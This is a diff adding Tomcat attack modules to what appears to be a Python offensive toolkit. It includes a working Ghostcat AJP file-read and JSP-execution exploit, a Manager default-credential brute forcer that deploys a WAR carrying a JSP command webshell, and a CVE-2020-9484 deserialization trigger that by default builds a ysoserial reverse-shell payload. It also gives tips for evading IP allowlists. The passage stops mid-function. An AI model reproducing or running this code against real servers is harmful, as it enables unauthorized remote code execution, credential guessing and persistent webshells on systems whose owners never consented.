@@ -33,6 +33,7 @@ import argparse
 import base64
 import hashlib
 import http.server as httpsrv
+import io
 import json
 import os
 import platform
@@ -52,6 +53,7 @@ import urllib.error
 import urllib.parse
 import urllib.request
 import webbrowser
+import zipfile
 
 from miniaes import aes_cbc_encrypt, aes_cbc_decrypt, aes_gcm_encrypt, aes_gcm_decrypt
 
@@ -4549,6 +4551,736 @@ def ex_tomcat_session_put(target, p):
             "trigger_status": tsc}
 
 
+# ============================================================
+# Tomcat 系列（第二批 4 个模块）
+#   4. tomcat.ajp_ghostcat    CVE-2020-1938   AJP13 文件读取 / 文件包含
+#   5. tomcat.manager_deploy  Manager 弱口令 + 部署 war
+#   6. tomcat.session_filestore CVE-2020-9484 FileStore session 反序列化
+#   7. tomcat.serref_variant  serrefA / serrefB 层级自动判定
+# ============================================================
+
+# ---------------- AJP13 编解码 ----------------
+# 外层：0x12 0x34 + payload_len(2B 大端) + payload
+# 注意：末尾**不要**多发一个 0x00（公开 PoC 00theway 那里多发了一个，是它的 bug）
+_AJP_MAGIC = b"\x12\x34"
+_AJP_RES_MAGIC = b"\x41\x42"
+
+# SC_REQ_* 简码：头名可以直接用 2 字节 code，不必按 string 编码
+_AJP_HEADER_CODES = {
+    "accept": 0xA001, "accept-charset": 0xA002, "accept-encoding": 0xA003,
+    "accept-language": 0xA004, "authorization": 0xA005, "connection": 0xA006,
+    "content-type": 0xA007, "content-length": 0xA008, "cookie": 0xA009,
+    "cookie2": 0xA00A, "host": 0xA00B, "pragma": 0xA00C, "referer": 0xA00D,
+    "user-agent": 0xA00E,
+}
+_AJP_METHODS = {"OPTIONS": 1, "GET": 2, "HEAD": 3, "POST": 4, "PUT": 5,
+                "DELETE": 6, "TRACE": 7, "PROPFIND": 8}
+
+_AJP_SEND_HEADERS = 4
+_AJP_SEND_BODY_CHUNK = 3
+_AJP_END_RESPONSE = 5
+_AJP_GET_BODY_CHUNK = 6
+
+
+def ajp_string(s):
+    """AJP string：长度(2B 大端，**不含**结尾 \\0) + 内容 + 0x00；None → 0xFFFF(null)。"""
+    if s is None:
+        return b"\xff\xff"
+    b = s.encode("utf-8", "ignore") if isinstance(s, str) else bytes(s)
+    return struct.pack(">H", len(b)) + b + b"\x00"
+
+
+def ajp_int(n):
+    """AJP integer 是 **2 字节**大端（不是 4 字节）—— 最容易写错的一处。"""
+    return struct.pack(">H", int(n) & 0xFFFF)
+
+
+def ajp_forward_request(method="GET", req_uri="/", protocol="HTTP/1.1",
+                        remote_addr="127.0.0.1", remote_host="127.0.0.1",
+                        server_name="localhost", server_port=80, is_ssl=False,
+                        headers=None, attributes=None):
+    """构造 AJP13 Forward Request（prefix_code=0x02）。返回 payload 字节（不含外层包头）。
+
+    字段顺序（错一个字节 Tomcat 就丢包）：
+      0x02, method(1B), protocol(string), req_uri(string), remote_addr(string),
+      remote_host(string), server_name(string), server_port(integer 2B),
+      is_ssl(1B), num_headers(integer 2B), headers…, attributes…, 0xFF
+    """
+    out = bytearray()
+    m = _AJP_METHODS.get((method or "GET").upper(), 2)
+    out += bytes([0x02, m])
+    out += ajp_string(protocol)
+    out += ajp_string(req_uri)
+    out += ajp_string(remote_addr)
+    out += ajp_string(remote_host)
+    out += ajp_string(server_name)
+    out += ajp_int(server_port)
+    out += bytes([1 if is_ssl else 0])
+
+    hdrs = []
+    for k, v in (headers or {}).items():
+        code = _AJP_HEADER_CODES.get((k or "").lower())
+        hdrs.append(ajp_int(code) if code is not None else ajp_string(k))
+        hdrs.append(ajp_string(v))
+    out += ajp_int(len(hdrs) // 2)
+    out += b"".join(hdrs)          # ← 别漏：只写了 num_headers 而没写头内容，Tomcat 直接丢包
+
+    for k, v in (attributes or {}).items():
+        out += bytes([0x0A])          # SC_A_REQ_ATTRIBUTE
+        out += ajp_string(k)
+        out += ajp_string(v)
+    out += b"\xff"                    # 属性终止符；就这一个字节，后面不许再加 0x00
+    return bytes(out)
+
+
+def ajp_packet(payload):
+    """外层包装：0x12 0x34 + len(payload)(2B 大端) + payload。**结尾不补 0x00**。"""
+    return _AJP_MAGIC + struct.pack(">H", len(payload)) + payload
+
+
+def ajp_transaction(sock, pkt, timeout=6.0):
+    """发一包、收若干帧：读到 End Response(5) 就收工。
+
+    不能「等连接关闭」—— Tomcat 处理完 AJP 请求通常保持连接不关，那样每次调用都要白等
+    一个完整 timeout。这里按帧逐个读，拿到 End Response 立即返回，空闲超过 timeout 也算结束。
+    """
+    sock.settimeout(timeout)
+    sock.sendall(pkt)
+    buf = b""
+    while True:
+        head = ajp_read_exact(sock, 4, timeout)
+        if len(head) < 4:
+            break
+        plen = struct.unpack(">H", head[2:4])[0]
+        pay = ajp_read_exact(sock, plen, timeout)
+        if len(pay) < plen:
+            buf += head + pay        # 截断了也留着，方便诊断
+            break
+        buf += head + pay
+        if pay and pay[0] == _AJP_END_RESPONSE:
+            break
+    return buf
+
+
+def ajp_read_exact(sock, n, timeout):
+    """读满 n 字节；读不到就返回已读部分（连接被 Tomcat 提前关很常见）。"""
+    buf = b""
+    deadline = time.time() + float(timeout)
+    while len(buf) < n:
+        left = deadline - time.time()
+        if left <= 0:
+            break
+        try:
+            sock.settimeout(left)
+            b = sock.recv(n - len(buf))
+        except Exception:
+            break
+        if not b:
+            break
+        buf += b
+    return buf
+
+
+def ajp_parse_response(data, logger=None):
+    """解析容器的 AJP13 回包序列。返回 {"frames":[], "status":0, "headers":{}, "body":b"", "notes":[]}
+
+    帧结构：0x41 0x42 + len(2B) + payload；payload[0] = 类型：
+      3=Send Body Chunk / 4=Send Headers / 5=End Response / 6=Get Body Chunk
+    ⚠ Send Body Chunk 尾部有一个 0x00，且**不计入 chunk_length**
+      （ajp_header.c 源码注释证实，官方 AJPv13a BNF 反而漏写）。所以读完 N 字节
+      内容后还要丢掉这 1 个字节，否则后续帧解析会整体错位。
+    """
+    out = {"frames": [], "status": 0, "headers": {}, "body": b"", "notes": []}
+    i = 0
+    while i + 4 <= len(data):
+        if data[i:i + 2] != _AJP_RES_MAGIC:
+            out["notes"].append("偏移 %d 处不是 AB 魔数（0x%02x%02x），后续解析放弃"
+                                % (i, data[i], data[i + 1]))
+            break
+        plen = struct.unpack(">H", data[i + 2:i + 4])[0]
+        if i + 4 + plen > len(data):
+            out["notes"].append("偏移 %d 处帧长 %d 但只剩 %d 字节（截断）"
+                                % (i, plen, len(data) - i - 4))
+            break
+        pay = data[i + 4:i + 4 + plen]
+        typ = pay[0] if pay else 0
+        out["frames"].append({"type": typ, "len": plen})
+        if typ == _AJP_SEND_BODY_CHUNK:
+            if len(pay) >= 3:
+                n = struct.unpack(">H", pay[1:3])[0]
+                chunk = pay[3:3 + n]
+                out["body"] += chunk
+                tail = pay[3 + n:4 + n]
+                if tail != b"\x00":
+                    out["notes"].append(
+                        "Send Body Chunk 尾部不是 0x00 而是 %r —— 说明本次 n(%d) 或长度字段算错"
+                        % (tail[:4], n))
+                else:
+                    out["frames"][-1]["tail_dropped"] = True
+        elif typ == _AJP_SEND_HEADERS:
+            j = 1
+            if len(pay) >= j + 2:
+                out["status"] = struct.unpack(">H", pay[j:j + 2])[0]
+                j += 2
+            # status reason phrase (string)：长度 + 内容 + 0x00
+            if len(pay) >= j + 2:
+                sl = struct.unpack(">H", pay[j:j + 2])[0]
+                j += 2
+                out["frames"][-1]["reason"] = pay[j:j + sl].decode("latin-1", "ignore")
+                j += sl + 1
+            if len(pay) >= j + 2:
+                nh = struct.unpack(">H", pay[j:j + 2])[0]
+                j += 2
+                for _ in range(nh):
+                    if pay[j:j + 2] == b"\xa0\x00":
+                        j += 1      # 0xA001~0xA00E 简码：高字节为 0xA0
+                        code = 0xA000 + pay[j]
+                        j += 1
+                        name = next((k for k, v in _AJP_HEADER_CODES.items()
+                                     if v == code), "0x%04x" % code)
+                    elif pay[j:j + 2] == b"\xff\xff":
+                        j += 2
+                        name = None
+                    else:
+                        sl = struct.unpack(">H", pay[j:j + 2])[0]
+                        j += 2
+                        name = pay[j:j + sl].decode("latin-1", "ignore")
+                        j += sl + 1
+                    if len(pay) < j + 2:
+                        break
+                    sl = struct.unpack(">H", pay[j:j + 2])[0]
+                    j += 2
+                    val = pay[j:j + sl].decode("latin-1", "ignore")
+                    j += sl + 1
+                    if name:
+                        out["headers"][name.lower()] = val
+        elif typ == _AJP_END_RESPONSE:
+            out["frames"][-1]["reuse"] = pay[1] if len(pay) > 1 else 0
+        elif typ == _AJP_GET_BODY_CHUNK:
+            out["notes"].append("容器回 Get Body Chunk（要求继续发送请求体）—— 本工具不跟进")
+        i += 4 + plen
+    return out
+
+
+def _ajp_target_host(target, p):
+    host, port = (target or "").strip(), int(p.get("port", 8009) or 8009)
+    if "//" in host:
+        u = urllib.parse.urlparse(normalize(host))
+        host = u.hostname or host.split("//")[-1].split(":")[0]
+    elif ":" in host and not host.startswith("["):
+        a, _, b = host.partition(":")
+        if b.isdigit():
+            host, port = a, int(b)
+    return host, port
+
+
+def ex_tomcat_ajp_ghostcat(target, p):
+    """CVE-2020-1938（Ghostcat）：AJP13 文件读取 / 本地文件包含。
+
+    Tomcat 把 AJP 属性直接 request.setAttribute()，而 DefaultServlet.getRelativePath()
+    与 JspServlet.service() 都信任 javax.servlet.include.*：
+      · 读取路径 = servlet_path + path_info，request_uri 非空才走这条分支
+      · req_uri 决定进哪个 Servlet：不以 .jsp 结尾 → DefaultServlet（读文件）；
+        必须以 .jsp 结尾 → JspServlet（文件包含 → RCE）
+      · 被包含的文件不需要 .jsp 后缀（可以是 .png/.jpg）
+      · ⚠ ../ 会被 RequestUtil.normalize() 拒绝 → **只能读当前 webapp 目录内的文件**
+    """
+    host, port = _ajp_target_host(target, p)
+    if not host:
+        return {"ok": False, "output": "host 为空", "detail": ""}
+    to = float(p.get("timeout", 6) or 6)
+    mode = (p.get("mode") or "probe").strip().lower()
+    file_path = (p.get("file_path") or "WEB-INF/web.xml").strip().lstrip("/")
+    jsp_file = (p.get("jsp_file") or "").strip()
+    req_uri = (p.get("req_uri") or "/asdf").strip()
+    ctx = (p.get("ctx") or "/").strip()
+
+    common = dict(protocol="HTTP/1.1", remote_addr="127.0.0.1",
+                  remote_host="127.0.0.1", server_name=host,
+                  server_port=80, is_ssl=False,
+                  headers={"Host": "%s:%d" % (host, port)})
+    attrs = {}
+    if mode == "read":
+        if req_uri.lower().endswith(".jsp"):
+            return {"ok": False, "output": "read 模式的 req_uri 不能以 .jsp 结尾",
+                    "detail": "req_uri 决定走哪个 Servlet：不以 .jsp 结尾才进 DefaultServlet（读文件）。\n"
+                              "你填的是 %s —— 那会进 JspServlet，读到的是渲染结果而不是源码。" % req_uri}
+        req_uri = req_uri or "/asdf"
+        # servlet_path + path_info 拼出最终路径：servlet_path="/" 时 path_info **不要带前导 /**，
+        # 否则拼成 "//WEB-INF/web.xml"（多一层斜杠，部分容器取不到）。
+        attrs = {"javax.servlet.include.request_uri": ctx or "/",
+                 "javax.servlet.include.servlet_path": "/",
+                 "javax.servlet.include.path_info": file_path}
+    elif mode == "exec":
+        if not jsp_file:
+            return {"ok": False, "output": "exec 模式必须填 jsp_file",
+                    "detail": "前置条件：目标 webapps 下必须**已经存在**一个你能控内容的文件"
+                              "（不一定是 .jsp，比如 uploads/a.png 里写 JSP 代码即可）。\n"
+                              "本模块只负责让 JspServlet 把它当 JSP 执行，**不负责写文件** ——\n"
+                              "写文件请用工具箱已有的 shell.upload / webshell.drop。"}
+        if not req_uri.lower().endswith(".jsp"):
+            req_uri = req_uri if req_uri.endswith("/") else req_uri
+            req_uri = "/asdf.jsp" if req_uri in ("", "/asdf") else req_uri + ".jsp"
+        jf = jsp_file.lstrip("/")     # 同 read 模式：path_info 不带前导 /
+        attrs = {"javax.servlet.include.request_uri": ctx or "/",
+                 "javax.servlet.include.servlet_path": "/",
+                 "javax.servlet.include.path_info": jf}
+    elif mode != "probe":
+        return {"ok": False, "output": "mode 只能是 probe / read / exec", "detail": ""}
+
+    payload = ajp_forward_request("GET", req_uri=req_uri, attributes=attrs, **common)
+    pkt = ajp_packet(payload)
+
+    try:
+        s = socket.create_connection((host, port), timeout=to)
+    except Exception as e:
+        return {"ok": False, "output": "连不上 %s:%d：%s: %s" % (host, port, type(e).__name__, e),
+                "detail": "先用 tomcat.probe 看 AJP 8009 是否开放；\n"
+                          "AJP 默认只在本地或受 RemoteAddrValve 保护的范围可达。"}
+    head = [
+        "目标        : %s:%d" % (host, port),
+        "模式        : %s" % mode,
+        "req_uri     : %s（决定进 DefaultServlet 还是 JspServlet）" % req_uri,
+        "属性        : %s" % (attrs if attrs else "无（probe 模式不带任何恶意属性）"),
+        "payload     : %d 字节（0x%04X）" % (len(payload), len(payload)),
+        "整包        : %d 字节，开头 %s" % (len(pkt), pkt[:4].hex(" ")),
+    ]
+    try:
+        raw = ajp_transaction(s, pkt, to)
+    except Exception as e:
+        try:
+            s.close()
+        except Exception:
+            pass
+        return {"ok": False, "output": "发送/接收失败: %s: %s" % (type(e).__name__, e),
+                "detail": "\n".join(head)}
+    try:
+        s.close()
+    except Exception:
+        pass
+
+    res = ajp_parse_response(raw)
+    head.append("回包        : %d 字节，%d 帧（%s）"
+                % (len(raw), len(res["frames"]),
+                   "/".join(str(f["type"]) for f in res["frames"]) or "无帧"))
+    head.append("HTTP 状态   : %s" % (res["status"] or "未解析到 Send Headers"))
+    if res["headers"]:
+        head.append("响应头      : %s" % "; ".join("%s=%s" % kv for kv in list(res["headers"].items())[:6]))
+    if res["notes"]:
+        head += ["⚠ %s" % n for n in res["notes"]]
+
+    if not raw:
+        head.append("")
+        head.append("一个字节都没回 —— 常见原因：\n"
+                    "  1) 目标 Tomcat 版本 > 9.0.31/8.5.51/7.0.100（已修，AJP 默认 requiredSecret）；\n"
+                    "  2) AJP Connector 配了 secretRequired=true + secret=… （需要密钥）；\n"
+                    "  3) 属性白名单挡住了 javax.servlet.include.*。")
+        return {"ok": False, "output": "无任何回包（AJP 可能已加固或需要 secret）",
+                "detail": "\n".join(head), "sent_len": len(pkt), "status": 0}
+
+    detail = "\n".join(head)
+    if mode == "probe":
+        st = res["status"]
+        if st in (200, 404):
+            ok, verdict = True, "AJP 开放且大概率可以利用（%s 表示 AJP 已正常处理请求）" % st
+        elif st == 403:
+            ok, verdict = False, ("返回 403 —— **可疑但不能判死**：可能是 secret 校验、"
+                                  "属性白名单拦截，也可能只是 patched 实例（secretRequired=false）"
+                                  "对这个 URI 没权限。建议再试 mode=read 读 WEB-INF/web.xml 确认。")
+        else:
+            ok, verdict = False, "返回 %s —— 未能确认可利用" % (st or "未知状态")
+    elif mode == "read":
+        body = res["body"].decode("utf-8", "ignore")
+        ok = bool(body.strip())
+        verdict = ("读到 %d 字节。⚠ 只能读**当前 webapp 目录内**的文件："
+                   "../ 会被 RequestUtil.normalize() 拒绝，file_path 别带穿越。"
+                   % len(res["body"])) if ok else \
+                  "没有读到内容（文件不存在、没有权限，或 AJP 侧被拦）"
+        if ok:
+            detail += "\n\n---- 文件内容（%s）----\n%s" % (file_path, body[:4000])
+    else:
+        ok = res["status"] == 200 and bool(res["body"].strip())
+        body_len = len(res["body"])
+        if ok and res["body"]:
+            detail += "\n\n---- 渲染结果前 1500 字 ----\n%s" % res["body"][:1500].decode("utf-8", "ignore")
+        if ok:
+            verdict = ("拿到 %d 字节渲染结果 —— 说明 jsp_file 里的 JSP 代码被执行了。\n"
+                       "  具体能不能当 shell 用，取决于你写进去的内容：先用一句 <%%=1+1%%> 之类\n"
+                       "  的无害表达式验证渲染通道是通的，再换成真正的功能代码。"
+                       % body_len)
+        else:
+            verdict = ("没拿到渲染结果：jsp_file 可能不在 webapp 目录内，或内容不是合法 JSP，"
+                       "也可能这个 .jsp req_uri 根本没路由到 JspServlet。")
+        if res["body"] and not ok:
+            detail += "\n\n---- 拿到的内容前 800 字 ----\n%s" % res["body"][:800].decode("utf-8", "ignore")
+
+    return {"ok": ok, "output": verdict.split("\n")[0],
+            "detail": detail + "\n\n【判定】 " + verdict,
+            "sent_len": len(pkt), "payload_len": len(payload), "status": res["status"]}
+
+
+# ---------------- Manager：弱口令 + war 部署 ----------------
+_MANAGER_WORDS = [
+    ("tomcat", "tomcat"), ("tomcat", ""), ("admin", "admin"), ("admin", ""),
+    ("manager", "manager"), ("both", "tomcat"), ("role1", "tomcat"),
+    ("tomcat", "s3cret"), ("admin", "tomcat"), ("tomcat", "admin"),
+    ("tomcat", "password"), ("admin", "password"),
+]
+
+_JSP_CMD = r'''<%@ page import="java.io.*,java.util.*" %>
+<%
+String c = request.getParameter("c");
+if (c == null) { out.println("usage: ?c=command"); return; }
+try {
+    String os = System.getProperty("os.name").toLowerCase();
+    Process p;
+    if (os.contains("win")) {
+        // Windows：cmd.exe /c
+        p = Runtime.getRuntime().exec(new String[]{"cmd.exe", "/c", c});
+    } else {
+        // Linux/Unix：**数组形式** exec，避免 exec(String) 按空格切 argv 的老问题，
+        // 由 sh -c 自己解释命令里的空格 / 管道 / 重定向。
+        p = Runtime.getRuntime().exec(new String[]{"/bin/sh", "-c", c});
+    }
+    BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
+    BufferedReader er = new BufferedReader(new InputStreamReader(p.getErrorStream()));
+    PrintWriter out2 = new java.io.PrintWriter(response.getOutputStream(), true);
+    String line;
+    while ((line = br.readLine()) != null) out2.println(line);
+    while ((line = er.readLine()) != null) out2.println(line);
+    out2.flush();
+} catch (Exception e) { out.println(e.toString()); }
+%>'''
+
+
+def _basic_auth(u, w):
+    return "Basic " + base64.b64encode(("%s:%s" % (u, w)).encode("latin-1")).decode()
+
+
+def build_manager_war(jsp_name="cmd.jsp"):
+    """最小 war：zip 根目录只放一个 JSP，不写 WEB-INF/web.xml。
+
+    Servlet 3.0+ 起 web.xml 非必需；省掉它在 Tomcat 7/8/9/10 上都最稳，
+    不会因为 web.xml 版本声明与容器不匹配而部署失败。
+    返回 war 二进制。
+    """
+    buf = io.BytesIO()
+    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as z:
+        zi = zipfile.ZipInfo(jsp_name)
+        zi.date_time = (2020, 1, 1, 0, 0, 0)
+        zi.external_attr = 0o644 << 16
+        z.writestr(zi, _JSP_CMD)
+    return buf.getvalue()
+
+
+def _manager_fail_body(body):
+    """Manager 的 /manager/text/* 接口：HTTP 状态码常常仍是 200，
+    真正的成败写在正文里 —— 必须以 `OK - ` / `FAIL - ` 判，不能只看 status。"""
+    b = (body or "").lstrip()
+    if b.startswith("FAIL") or b.startswith("- Error") or b.upper().startswith("FAIL -"):
+        return True
+    return False
+
+
+def _manager_words(p):
+    w = []
+    u = (p.get("user") or "").strip()
+    pw = p.get("pass")
+    pw = "" if pw is None else pw
+    if u:
+        w.append((u, pw))
+        return w
+    return list(_MANAGER_WORDS)
+
+
+def ex_tomcat_manager_deploy(target, p):
+    """Manager 弱口令爆破 + deployment war 拿 shell。
+
+    ⚠ path=/ + update=true 会**覆盖现有 ROOT 应用**，是破坏性操作。
+    """
+    base = normalize(target)
+    if not base:
+        return {"ok": False, "output": "target 为空", "detail": ""}
+    to = int(p.get("timeout", 10) or 10)
+    mode = (p.get("mode") or "brute").strip().lower()
+    path = (p.get("path") or "/shell").strip()
+    jsp_name = (p.get("jsp_name") or "cmd.jsp").strip().lstrip("/") or "cmd.jsp"
+    cmd = (p.get("cmd") or "id").strip()
+
+    warn_root = []
+    if mode in ("deploy", "list") and path in ("/", "/ROOT", ""):
+        warn_root.append("★ 破坏性提醒：path=%s 会**覆盖目标现有的 ROOT 应用**；"
+                         "授权测试里建议用 /shell 这类独立路径。" % path)
+
+    def _probe_list(u, w, show=True):
+        r = http(base + "/manager/text/list", timeout=to,
+                 headers={"Authorization": _basic_auth(u, w)}, allow_redirect=False)
+        body = r["body"] or ""
+        good = r["status"] == 200 and not _manager_fail_body(body) and bool(body.strip())
+        return good, r["status"], body.strip()[:300]
+
+    # ---- 爆破 / 复用凭据 ----
+    cred = None
+    lines = []
+    if (p.get("user") or "").strip() or mode in ("brute", "deploy", "list"):
+        for u, w in _manager_words(p):
+            good, sc, body = _probe_list(u, w)
+            lines.append("%-10s / %-12s → HTTP %s %s" % (
+                u, w or "(空)", sc,
+                "✔ 命中" if good else (body.splitlines()[0][:60] if body else "")))
+            if good:
+                cred = (u, w)
+                break
+
+    if mode == "brute":
+        return {"ok": bool(cred),
+                "output": ("命中弱口令: %s / %s" % cred) if cred else "内置字典未命中（%d 组）" % len(_manager_words(p)),
+                "detail": "\n".join(lines) +
+                          ("\n\n下一步：mode=list 列应用，mode=deploy 部署 war。"
+                           if cred else
+                           "\n\n没命中也不代表没戏：可能是 403 被 RemoteCIDRValve 的 IP 白名单拦了 ——\n"
+                           "Tomcat 8.5+ 默认只允许 127.0.0.1/::1 访问 /manager，\n"
+                           "**这种情况与口令无关**，得换 signalling：换本机做跳板、或利用 SSRF 打 127.0.0.1。"),
+                "cred": ("%s:%s" % cred) if cred else ""}
+
+    if mode == "list":
+        if not cred:
+            return {"ok": False, "output": "没有可用凭据（先跑 mode=brute 或手填 user/pass）",
+                    "detail": "\n".join(lines) + "\n\n" + "\n".join(warn_root)}
+        good, sc, body = _probe_list(*cred)
+        return {"ok": good, "output": ("已列出应用（凭据 %s:%s）" % cred) if good else "列应用失败",
+                "detail": "GET /manager/text/list → HTTP %s\n\n%s\n\n%s"
+                          % (sc, body, "\n".join(warn_root))}
+
+    if mode != "deploy":
+        return {"ok": False, "output": "mode 只能是 brute / list / deploy", "detail": ""}
+
+    if not cred:
+        return {"ok": False, "output": "部署前必须先有有效凭据",
+                "detail": "\n".join(lines) +
+                          "\n\n先用 mode=brute 爆破，或在 user/pass 里手填一对 manager-script 角色的账号。"}
+
+    war = build_manager_war(jsp_name)
+    url = "%s/manager/text/deploy?path=%s&update=true" % (base, urllib.parse.quote(path))
+    r = http(url, method="PUT", data=war, raw=True, timeout=max(to, 15),
+             ctype="application/octet-stream",
+             headers={"Authorization": _basic_auth(*cred)}, allow_redirect=False)
+    body = (r["body"] or "").strip()
+    sc = r["status"]
+    head = ["war         : %d 字节（内含根目录 %s，无 WEB-INF/web.xml）" % (len(war), jsp_name),
+            "PUT         : %s" % url,
+            "凭据        : %s / %s" % (cred[0], cred[1] or "(空)"),
+            "HTTP        : %s" % sc]
+    head += warn_root
+
+    if sc == 401:
+        return {"ok": False, "output": "401 认证失败（账号口令不对）", "deploy_status": sc,
+                "detail": "\n".join(head) + "\n\n" + body[:400]}
+    if sc == 403:
+        return {"ok": False, "output": "403 被拒绝 —— 多半与口令无关", "deploy_status": sc,
+                "detail": "\n".join(head) + "\n\n" + body[:400] + "\n\n"
+                          "★ 两种最常见原因：\n"
+                          "  1) 账号没有 **manager-script** 角色（只有 manager-gui/html 也不能 deploy）；\n"
+                          "  2) RemoteCIDRValve 的 IP 白名单 —— Tomcat 8.5+ **默认只允许 127.0.0.1/::1**\n"
+                          "     访问 /manager。远程调用得先解决来源 IP（跳板 / SSRF 打 127.0.0.1）。"}
+    deployed = (sc == 200 and not _manager_fail_body(body)
+                and (body.startswith("OK") or "Deployed application" in body))
+    if not deployed:
+        return {"ok": False, "deploy_status": sc,
+                "output": "部署失败：%s" % (body.splitlines()[0][:120] if body else "HTTP %s 且无正文" % sc),
+                "detail": "\n".join(head) + "\n\n---- 返回正文 ----\n" + body[:1500] +
+                          "\n\n★ 注意：Manager 的 text 接口失败时 HTTP 状态码**往往仍是 200**，\n"
+                          "  所以本模块一律按正文的 OK - / FAIL - 判定，不看 status。"}
+
+    head.append("部署结果    : %s" % body.splitlines()[0][:160])
+    shell_url = "%s%s/%s?c=%s" % (base, path, jsp_name, urllib.parse.quote(cmd))
+    try:
+        vr = http(shell_url, timeout=to)
+        vb, vsc = vr["body"], vr["status"]
+    except Exception as e:
+        vb, vsc = "", 0
+        head.append("验证异常    : %s" % e)
+    head.append("验证        : GET %s → HTTP %s" % (shell_url, vsc))
+    ok = (vsc == 200 and bool((vb or "").strip()) and "usage:" not in vb[:80])
+    if ok:
+        head.append("")
+        head.append("★ 已拿到命令执行：%s" % shell_url)
+        head.append("---- `%s` 回显 ----" % cmd)
+        head.append((vb or "")[:2000])
+        verdict = "war 部署成功且 JSP 可执行（%s/%s）" % (path, jsp_name)
+    else:
+        head.append("")
+        head.append("部署调用返回 OK，但访问 %s 没拿到回显。排查：\n"
+                    "  1) 路径是否拼对（path=%s，jsp=%s）；\n"
+                    "  2) 刚部署完可能还没热起来，隔 1~2 秒重试；\n"
+                    "  3) 目标可能有 SecurityManager 或容器级 JSP 禁用。" % (shell_url, path, jsp_name))
+        verdict = "war 部署成功但 JSP 未回显（见下方排查）"
+    return {"ok": ok, "output": verdict, "detail": "\n".join(head),
+            "shell_url": shell_url, "deploy_status": sc}
+
+
+# ---------------- CVE-2020-9484 ----------------
+def ex_tomcat_session_filestore(target, p):
+    """CVE-2020-9484：FileStore session 反序列化。
+
+    FileStore.file(id) = <id>.session，默认 directory "." 解析到 work 目录；
+    StandardSession.doReadObject() 第一个 readObject() 读到的就是 payload 顶层对象 →
+    gadget 当场触发，之后的 (Long) 转型抛 ClassCastException 只是善后。
+    所以**裸 ysoserial 字节即可**，不需要拼完整 Session 结构。
+
+    ⚠ **本模块不写文件** —— 必须先有一个上传点把 .session 内容放到目标上，
+       然后用 JSESSIONID 穿越到那个文件触发。
+    """
+    base = normalize(target)
+    if not base:
+        return {"ok": False, "output": "target 为空", "detail": ""}
+    to = int(p.get("timeout", 10) or 10)
+    sp = (p.get("session_path") or "").strip()
+    trigger = (p.get("trigger_path") or "/index.jsp").strip()
+    gadget = (p.get("gadget") or "CommonsCollections6").strip()
+    cmd = (p.get("cmd") or "").strip()
+    auto = False
+    if not cmd or cmd.upper() in ("REVERSE", "SHELL"):
+        cmd = _reverse_cmd(p, target)
+        auto = True
+    okc, cnote = _exec_cmd_check(cmd, target)
+    if not okc:
+        return {"ok": False, "output": "命令不可用", "detail": cnote}
+    if not sp:
+        return {"ok": False, "output": "必须填 session_path",
+                "detail": "CVE-2020-9484 需要**目标上已经存在**一个内容是序列化 payload 的文件。\n"
+                          "本模块只负责触发，**不负责写文件**：\n"
+                          "  · 先用 ysoserial 生成要用的那段字节（见下方 gadget/cmd）；\n"
+                          "  · 再用工具箱已有的 **shell.upload**（经反弹 shell 上传）或\n"
+                          "    **webshell.drop**（落地一句话后经马上传）把它放到目标上；\n"
+                          "  · 然后 session_path 填那个文件（不带 .session 后缀），可以用 ../ 穿越。"}
+
+    raw, err = yso_generate(gadget, cmd)
+    lines = ["目标          : %s" % base,
+             "session 文件  : %s  → FileStore 实际读 %s.session" % (sp, sp),
+             "触发路径      : %s（必须会调 request.getSession()）" % trigger,
+             "gadget        : %s" % gadget,
+             "自动拼命令    : %s" % ("是 → " + cmd if auto else "否")]
+    if cnote:
+        lines.append(cnote)
+    lines.append("")
+    lines.append("【本次要写进目标文件的字节】 ysoserial %s \"%s\" → %d 字节（%s…）"
+                 % (gadget, cmd, len(raw) if raw else 0, raw[:4].hex() if raw else ""))
+    if not raw:
+        lines.append("生成失败：%s" % err)
+        return {"ok": False, "output": "payload 生成失败", "detail": "\n".join(lines)}
+
+    turl = base + trigger
+    tr = http(turl, headers={"Cookie": "JSESSIONID=%s" % sp}, timeout=to, allow_redirect=False)
+    tsc, tbody = tr["status"], tr["body"]
+    lines.append("【触发】 GET %s  Cookie: JSESSIONID=%s → HTTP %s" % (turl, sp, tsc))
+
+    evid = [k for k in ("ClassCastException", gadget, "ysoserial", "PriorityQueue",
+                        "InvocationTargetException", "TemplatesImpl") if k in (tbody or "")]
+    if tsc == 500 and evid:
+        ok = True
+        verdict = ("★ payload 已触发：命令在异常抛出**之前**就执行了（命中 %s）" % "、".join(evid))
+    elif tsc == 500:
+        ok = False
+        verdict = ("返回 500 但响应体没看到 ClassCastException / %s —— 可能是别处的 500，"
+                   "也可能 FileStore 读到的根本不是你的 payload。用带外或反弹确认。" % gadget)
+    elif tsc == 0:
+        return {"ok": False, "output": "目标不可达：%s" % (tr["err"] or "连接失败"),
+                "detail": "\n".join(lines)}
+    else:
+        ok = False
+        verdict = ("返回 %s —— 多半没走到 session 查找。排查：\n"
+                   "  1) 触发端点必须会 request.getSession() —— 默认 JSP 会，静态资源不会；\n"
+                   "  2) session_path 对不对？FileStore 会拼上 .session，"
+                   "且默认 directory 是相对 work 目录的，需要 ../ 穿越到文件真实位置；\n"
+                   "  3) 是否真的配了 PersistentManager + FileStore？没配就不会读文件。" % tsc)
+    lines.append("")
+    lines.append("【判定】 %s" % verdict)
+    lines.append("")
+    lines.append("★ 写文件请用工具箱已有的 shell.upload / webshell.drop —— 本模块不提供写能力。")
+    return {"ok": ok, "output": verdict.split("\n")[0],
+            "detail": "\n".join(lines) + ("\n\n---- 响应体前 800 字 ----\n" + tbody[:800] if tbody else ""),
+            "trigger_status": tsc}
+
+
+# ---------------- serrefA / serrefB 层级自动判定 ----------------
+def _serref_variant_for(version):
+    """按 Tomcat 版本判断该用哪条 ResourceRef 层级。
+
+      B = 新层级 ResourceRef → AbstractRef → Reference（Tomcat 8.5.7x+ / 9.0.4x+ / 10.x / 11.x）
+      A = 老层级 ResourceRef 直连 Reference（8.0.x / 8.5.<70 / 9.0.<40 / 7.x）
+
+    返回 (variant, 理由)；版本未知返回 (None, 理由)。
+    """
+    t = _ver_tuple(version)
+    if not t:
+        return None, "版本未知"
+    maj = t[0]
+    mnr = t[1] if len(t) > 1 else 0
+    pat = t[2] if len(t) > 2 else 0
+    if maj >= 10:
+        return "B", "Tomcat %s 的 ResourceRef 一律走 ResourceRef→AbstractRef→Reference 新层级" % version
+    if maj == 9 and (mnr > 0 or (mnr == 0 and pat >= 40)):
